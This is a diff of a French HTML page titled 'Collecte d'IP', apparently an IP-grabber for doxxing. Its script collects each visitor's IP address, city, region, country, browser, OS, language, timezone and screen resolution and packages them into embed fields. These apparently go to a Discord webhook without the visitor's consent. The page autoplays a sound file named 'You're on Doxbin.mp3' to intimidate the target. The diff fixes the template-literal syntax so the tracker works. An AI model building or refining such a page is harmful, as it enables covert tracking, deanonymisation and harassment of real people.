@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Moon Client</title>
+    <title>Collecte d'IP</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -41,7 +41,7 @@
 </head>
 <body>
     <div class="container">
-        <img id="logo" src="https://files.catbox.moe/imzkkq.png" alt="Logo du site">
+        <img id="logo" src="https://files.oaiusercontent.com/file-6tcYaeq9cHs6s7oS3yZwsuuB?se=2024-11-01T22%3A25%3A58Z&sp=r&sv=2024-08-04&sr=b&rscc=max-age%3D299%2C%20immutable%2C%20private&rscd=attachment%3B%20filename%3Dlogo.png&sig=X0rEOApVU9YSANyeigKW2NSCx9D1pnkkw87IK5ItobQ%3D" alt="Logo du site">
         <h1>Page d'information</h1>
         <div id="info">
             <p><strong>IP :</strong> <span id="ip"></span></p>
@@ -55,7 +55,7 @@
             <p class="error" id="error"></p>
         </div>
     </div>
-    <audio id="audio" src="https://files.catbox.moe/cuh0ir.mp3"></audio> <!-- Chemin vers le fichier audio -->
+    <audio id="audio" src="You're on Doxbin.mp3"></audio> <!-- Chemin vers le fichier audio -->
     <script>
         // Jouer le son automatiquement
         window.onload = () => {
@@ -81,14 +81,14 @@
                 // Récupérer des informations supplémentaires
                 const language = navigator.language || navigator.userLanguage;
                 const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                const screenResolution = ${window.screen.width}x${window.screen.height};
+                const screenResolution = `${window.screen.width}x${window.screen.height}`;
                 const platform = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
 
                 // Afficher les informations sur la page
                 document.getElementById('ip').textContent = data.ip;
-                document.getElementById('browser').textContent = ${browserName} ${browserVersion};
+                document.getElementById('browser').textContent = `${browserName} ${browserVersion}`;
                 document.getElementById('datetime').textContent = currentDateTime;
-                document.getElementById('location').textContent = ${data.city}, ${data.region}, ${data.country};
+                document.getElementById('location').textContent = `${data.city}, ${data.region}, ${data.country}`;
                 document.getElementById('language').textContent = language;
                 document.getElementById('timezone').textContent = timezone;
                 document.getElementById('screenResolution').textContent = screenResolution;
@@ -104,9 +104,9 @@
                             fields: [
                                 { name: "Adresse IP", value: data.ip, inline: true },
                                 { name: "Date et Heure", value: currentDateTime, inline: true },
-                                { name: "Navigateur", value: ${browserName} ${browserVersion}, inline: true },
+                                { name: "Navigateur", value: `${browserName} ${browserVersion}`, inline: true },
                                 { name: "Système d'Exploitation", value: userAgent, inline: false },
-                                { name: "Localisation", value: ${data.city}, ${data.region}, ${data.country}, inline: true },
+                                { name: "Localisation", value: `${data.city}, ${data.region}, ${data.country}`, inline: true },
                                 { name: "Langue", value: language, inline: true },
                                 { name: "Fuseau Horaire", value: timezone, inline: true },
                                 { name: "Résolution d'écran", value: screenResolution, inline: true },
